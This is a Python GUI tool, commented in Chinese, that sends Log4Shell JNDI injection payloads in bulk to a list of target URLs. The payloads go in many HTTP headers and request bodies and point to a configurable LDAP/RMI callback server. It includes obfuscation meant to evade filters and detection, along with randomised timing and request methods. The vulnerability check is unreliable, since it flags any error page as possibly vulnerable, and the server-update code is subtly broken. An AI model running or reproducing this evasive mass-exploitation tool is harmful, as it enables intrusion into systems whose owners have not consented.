import requests
import csv
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from concurrent.futures import ThreadPoolExecutor
import threading
import urllib3
from urllib.parse import urlparse
import base64
import random
import string
import re
import time

# 禁用 SSL 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 扩展 JNDI payload 列表
JNDI_PAYLOADS = [
    "${jndi:ldap://example.com/a}",
    "${jndi:rmi://example.com/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://example.com/a}",
    "${${::-j}ndi:rmi://example.com/a}",
    "${jndi:dns://example.com/a}",
    "${${lower:jndi}:${lower:rmi}://example.com/a}",
    "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//example.com/a}"
]

# 扩展检测的 HTTP 头
HEADERS_TO_TEST = [
    "User-Agent",
    "X-Api-Version",
    "X-Forwarded-For",
    "X-Remote-IP",
    "X-Client-IP",
    "X-Real-IP",
    "X-Originating-IP",
    "CF-Connecting-IP",
    "True-Client-IP",
    "Referer",
    "Cookie"
]

def obfuscate_payload(payload):
    """对 payload 进行混淆"""
    techniques = [
        lambda p: p.replace("j", "${::-j}").replace("n", "${::-n}").replace("d", "${::-d}").replace("i", "${::-i}"),
        lambda p: p.replace("jndi", "${${env:TEST:-j}${env:TEST:-n}${env:TEST:-d}${env:TEST:-i}}"),
        lambda p: p.replace("jndi", "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}}"),
        lambda p: p.replace("jndi", "${${env:BARFOO:-j}${env:BARFOO:-n}${env:BARFOO:-d}${env:BARFOO:-i}}"),
        lambda p: base64.b64encode(p.encode()).decode()
    ]
    return random.choice(techniques)(payload)

def generate_random_headers():
    """生成随机的 HTTP 头"""
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15'
        ])
    }
    return headers

def generate_custom_payload(server_address):
    """生成自定义的 payload"""
    base_payloads = [
        "${jndi:ldap://%s/%s}",
        "${jndi:rmi://%s/%s}",
        "${jndi:dns://%s/%s}"
    ]
    
    # 生成随机路径
    random_path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    payload = random.choice(base_payloads) % (server_address, random_path)
    return obfuscate_payload(payload)

def generate_headers():
    """生成包含混淆 payload 的 headers"""
    headers = generate_random_headers()
    server = JNDI_PAYLOADS[0].split("://")[1].split("/")[0]  # 提取服务器地址
    
    for header in HEADERS_TO_TEST:
        payload = generate_custom_payload(server)
        headers[header] = payload
        yield headers
        headers = generate_random_headers()  # 每次都使用新的基础 headers

def check_log4j_vulnerability(url):
    """改进的漏洞检测逻辑，添加免杀功能"""
    results = []
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # 添加随机延迟
        time.sleep(random.uniform(0.5, 2))
        
        for headers in generate_headers():
            try:
                # 随机选择请求方法
                method = random.choice(['GET', 'POST', 'PUT', 'HEAD'])
                
                if method in ['POST', 'PUT']:
                    # 构造随机的请求体
                    data = {
                        'param': generate_custom_payload(parsed_url.netloc),
                        'timestamp': str(time.time())
                    }
                    response = requests.request(
                        method,
                        url,
                        headers=headers,
                        json=data,
                        timeout=10,
                        verify=False,
                        allow_redirects=False
                    )
                else:
                    response = requests.request(
                        method,
                        url,
                        headers=headers,
                        timeout=10,
                        verify=False,
                        allow_redirects=False
                    )
                
                # 扩展检测特征
                if any([
                    response.status_code == 500,
                    re.search(r"java\.(lang|io|net)\..*Exception", response.text),
                    re.search(r"javax\.naming\..*Exception", response.text),
                    "error" in response.text.lower(),
                    "exception" in response.text.lower(),
                    "stacktrace" in response.text.lower()
                ]):
                    return "可能存在漏洞"
                
            except requests.exceptions.RequestException:
                continue
                
        return "未发现漏洞"
    except Exception as e:
        return f"检测失败：{str(e)}"

def scan_urls(input_file, output_file, result_tree, progress_var):
    """使用线程池进行并发扫描"""
    results = []
    try:
        urls = []
        # 根据文件扩展名决定如何读取文件
        file_ext = input_file.lower().split('.')[-1]
        
        if file_ext == 'csv':
            with open(input_file, "r", encoding='utf-8') as f:
                csv_reader = csv.reader(f)
                # 跳过标题行
                next(csv_reader, None)
                urls = [row[0].strip() for row in csv_reader if row]
        else:  # txt 或其他文件格式
            with open(input_file, "r", encoding='utf-8') as f:
                urls = [line.strip() for line in f.readlines() if line.strip()]
        
        total_urls = len(urls)
        if total_urls == 0:
            messagebox.showwarning("警告", "输入文件中没有找到有效的 URL！")
            return
            
        progress_var.set(0)
        
        def update_progress(future):
            progress = progress_var.get() + (100.0 / total_urls)
            progress_var.set(progress)
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_url = {executor.submit(check_log4j_vulnerability, url): url for url in urls}
            for future in future_to_url:
                url = future_to_url[future]
                try:
                    status = future.result()
                    results.append({"url": url, "status": status})
                    # 在主线程中更新 GUI
                    root = result_tree.winfo_toplevel()
                    root.after(0, lambda: result_tree.insert("", "end", values=(url, status)))
                    update_progress(future)
                except Exception as e:
                    results.append({"url": url, "status": f"检测失败：{str(e)}"})

        # 保存到 CSV 文件
        with open(output_file, "w", newline="", encoding='utf-8') as csvfile:
            fieldnames = ["url", "status"]
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(results)

        messagebox.showinfo("扫描完成", f"扫描完成，结果已保存到 {output_file}")
    except Exception as e:
        messagebox.showerror("错误", f"扫描失败：{str(e)}")

def start_scan(result_tree, input_path_var, output_path_var, progress_var):
    """改进的开始扫描函数"""
    input_file = input_path_var.get()
    output_file = output_path_var.get()

    if not input_file or not output_file:
        messagebox.showwarning("警告", "请提供输入文件路径和输出文件路径！")
        return

    # 清空结果表格
    for item in result_tree.get_children():
        result_tree.delete(item)
    
    # 禁用开始按钮
    for widget in result_tree.master.master.winfo_children():
        if isinstance(widget, ttk.Frame):
            for button in widget.winfo_children():
                if isinstance(button, ttk.Button) and button['text'] == "开始扫描":
                    button.configure(state='disabled')
    
    # 开始扫描
    try:
        scan_urls(input_file, output_file, result_tree, progress_var)
    finally:
        # 恢复开始按钮
        for widget in result_tree.master.master.winfo_children():
            if isinstance(widget, ttk.Frame):
                for button in widget.winfo_children():
                    if isinstance(button, ttk.Button) and button['text'] == "开始扫描":
                        button.configure(state='normal')

def log4j_vulnerability_poc(result_tree, input_path_var, output_path_var):
    """try to use log4j vulnerability"""
    input_file = input_path_var.get()
    output_file = output_path_var.get()




def select_input_file(input_path_var):
    """选择输入文件"""
    file_path = filedialog.askopenfilename(
        title="选择目标 URL 文件",
        filetypes=[
            ("文本文件", "*.txt"),
            ("CSV 文件", "*.csv"),
            ("所有文件", "*.*")
        ]
    )
    if file_path:
        input_path_var.set(file_path)

def select_output_file(output_path_var):
    """选择输出文件"""
    file_path = filedialog.asksaveasfilename(title="选择保存结果的文件", defaultextension=".csv", filetypes=[("CSV Files", "*.csv")])
    if file_path:
        output_path_var.set(file_path)

def create_gui():
    """创建改进的 GUI 界面"""
    root = tk.Tk()
    root.title("Log4j 漏洞批量检测工具")
    root.geometry("900x700")
    
    # 设置整体样式
    style = ttk.Style()
    style.configure("TButton", padding=6, relief="flat", background="#2196F3")
    style.configure("TLabel", padding=5)
    style.configure("TFrame", background="#f5f5f5")
    
    # 创建主框架
    main_frame = ttk.Frame(root, padding="10")
    main_frame.pack(fill=tk.BOTH, expand=True)
    
    # 服务器配置区域
    server_frame = ttk.LabelFrame(main_frame, text="服务器配置", padding="10")
    server_frame.pack(fill=tk.X, pady=(0, 10))
    
    # LDAP 服务器配置
    ldap_var = tk.StringVar(value="example.com")
    ttk.Label(server_frame, text="LDAP/RMI 服务器地址:").pack(side=tk.LEFT, padx=5)
    ldap_entry = ttk.Entry(server_frame, textvariable=ldap_var, width=40)
    ldap_entry.pack(side=tk.LEFT, padx=5)
    
    def update_payloads():
        """更新所有 payload 中的服务器地址"""
        new_server = ldap_var.get()
        global JNDI_PAYLOADS
        JNDI_PAYLOADS = [
            payload.replace("example.com", new_server)
            for payload in [
                "${jndi:ldap://%s/a}",
                "${jndi:rmi://%s/a}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s/a}",
                "${${::-j}ndi:rmi://%s/a}",
                "${jndi:dns://%s/a}",
                "${${lower:jndi}:${lower:rmi}://%s/a}",
                "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//%s/a}"
            ]
        ]
        messagebox.showinfo("成功", "服务器地址已更新！")
    
    ttk.Button(
        server_frame,
        text="更新服务器",
        command=update_payloads
    ).pack(side=tk.LEFT, padx=5)
    
    # 文件选择区域
    file_frame = ttk.LabelFrame(main_frame, text="文件选择", padding="10")
    file_frame.pack(fill=tk.X, pady=(0, 10))
    
    input_path_var = tk.StringVar()
    output_path_var = tk.StringVar()
    
    # 输入文件选择
    input_frame = ttk.Frame(file_frame)
    input_frame.pack(fill=tk.X, pady=5)
    ttk.Label(input_frame, text="目标文件：").pack(side=tk.LEFT)
    ttk.Entry(input_frame, textvariable=input_path_var, width=50).pack(side=tk.LEFT, padx=5)
    ttk.Button(
        input_frame,
        text="浏览",
        command=lambda: select_input_file(input_path_var)
    ).pack(side=tk.LEFT)
    
    # 输出文件选择
    output_frame = ttk.Frame(file_frame)
    output_frame.pack(fill=tk.X, pady=5)
    ttk.Label(output_frame, text="输出文件：").pack(side=tk.LEFT)
    ttk.Entry(output_frame, textvariable=output_path_var, width=50).pack(side=tk.LEFT, padx=5)
    ttk.Button(
        output_frame,
        text="浏览",
        command=lambda: select_output_file(output_path_var)
    ).pack(side=tk.LEFT)
    
    # 进度条区域
    progress_frame = ttk.LabelFrame(main_frame, text="扫描进度", padding="10")
    progress_frame.pack(fill=tk.X, pady=(0, 10))
    
    progress_var = tk.DoubleVar()
    progress_bar = ttk.Progressbar(
        progress_frame,
        variable=progress_var,
        maximum=100,
        mode='determinate',
        length=300
    )
    progress_bar.pack(fill=tk.X, pady=5)
    
    # 控制按钮区域
    control_frame = ttk.Frame(main_frame)
    control_frame.pack(fill=tk.X, pady=(0, 10))
    
    start_button = ttk.Button(
        control_frame,
        text="开始扫描",
        command=lambda: start_scan(result_tree, input_path_var, output_path_var, progress_var)
    )
    start_button.pack(pady=5)
    
    # 结果显示区域
    result_frame = ttk.LabelFrame(main_frame, text="扫描结果", padding="10")
    result_frame.pack(fill=tk.BOTH, expand=True)
    
    # 创建带滚动条的结果表格
    tree_scroll = ttk.Scrollbar(result_frame)
    tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
    
    columns = ("url", "status")
    result_tree = ttk.Treeview(
        result_frame,
        columns=columns,
        show="headings",
        yscrollcommand=tree_scroll.set
    )
    result_tree.heading("url", text="URL")
    result_tree.heading("status", text="状态")
    result_tree.column("url", width=500)
    result_tree.column("status", width=200)
    
    tree_scroll.config(command=result_tree.yview)
    result_tree.pack(fill=tk.BOTH, expand=True)
    
    # 状态栏
    status_frame = ttk.Frame(main_frame)
    status_frame.pack(fill=tk.X, pady=(5, 0))
    status_label = ttk.Label(
        status_frame,
        text="就绪",
        anchor=tk.W
    )
    status_label.pack(fill=tk.X)
    
    # 添加一些样式
    for child in main_frame.winfo_children():
        child.configure(padding=3)
    
    return root

if __name__ == "__main__":
    root = create_gui()
    root.mainloop()